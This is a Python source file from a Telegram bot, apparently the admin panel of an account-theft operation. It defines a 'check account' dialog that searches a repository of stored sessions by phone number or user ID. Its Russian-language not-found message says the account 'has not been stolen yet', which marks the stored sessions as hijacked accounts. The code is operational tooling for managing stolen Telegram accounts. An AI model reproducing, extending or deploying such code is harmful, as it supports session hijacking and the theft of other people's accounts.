from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession

from tgbot.states.State import State


async def check(message, state, repo, edit):
	title = '🔍 Чек аккаунта'
	text = [
		"Введите номер телефона или ID существующей сессии."
	]
	await state.update_data(_select=None)
	markup = await keyboard.admin.back_to_menu()
	await dialog(message, edit=edit, text=text, markup=markup, title=title)


async def check_result(message, state, repo, edit):
	result = None
	data = await state.get_data()
	user_id = data['find']

	for i in repo.storage.keys():
		user = repo.storage[i]
		if not user['reset_auth']: continue
		if user['user_id'] == str(user_id) or user['phone'].replace('+', '') == str(user_id).replace('+', ''):
			result = user['phone']
			break

	if result:
		await State.admin.open_acc.set()
		await state.update_data(_select=result)
	else:
		await message.answer('❗️Пользователь не найден. Вероятно его не существует в базе, или же аккаунт еще не украден.')
		await State.admin.check.set()

	return await migrate(
		state=state,
		message=message,
		repo=repo,
		edit=edit
	)



async def dialog_admin_check(state, message, current_state, repo, edit: bool=True):
	if current_state == State.admin.check.state:
		await check(message, state, repo, edit)
	if current_state == State.admin.check_result.state:
		await check_result(message, state, repo, edit)